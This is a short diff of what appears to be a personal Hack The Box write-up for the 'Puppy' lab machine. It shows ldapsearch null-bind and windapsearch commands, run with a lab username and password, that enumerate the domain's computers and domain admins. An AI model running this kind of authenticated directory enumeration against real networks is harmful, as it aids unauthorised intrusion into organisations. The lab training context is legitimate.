@@ -104,7 +104,7 @@ text: 000004DC: LdapErr: DSID-0C090DA9, comment: In order to perform this opera
 
 ```
 - The error message indicates that anonymous searching of the directory is not allowed - you need to authenticate first. Gippity says to try NULL bind:
-```
+```py
 ┌──(root㉿kali)-[/home/jacob/Desktop]
 └─# ldapsearch -x -H ldap://10.10.11.70 -D "" -w "" -b "dc=PUPPY,dc=HTB"                                                                                               
 # extended LDIF
@@ -504,14 +504,6 @@ dNSHostName: DC.PUPPY.HTB
 ```
 - Ran `--da` flag
 ```py
-┌──(v-env)(root㉿kali)-[/home/jacob/Desktop/Boxes/Puppy/windapsearch]
-└─# python3 windapsearch.py --dc-ip 10.10.11.70 -d PUPPY.HTB -u levi.james -p "KingofAkron2025!" --computers
-[+] Using Domain Controller at: 10.10.11.70
-[+] Getting defaultNamingContext from Root DSE
-[+]     Found: DC=PUPPY,DC=HTB
-[+] Attempting bind
-[!] Error: invalid credentials
-
 ┌──(v-env)(root㉿kali)-[/home/jacob/Desktop/Boxes/Puppy/windapsearch]
 └─# python3 windapsearch.py --dc-ip 10.10.11.70 -u levi.james@PUPPY.HTB -p "KingofAkron2025!" --da
 [+] Using Domain Controller at: 10.10.11.70
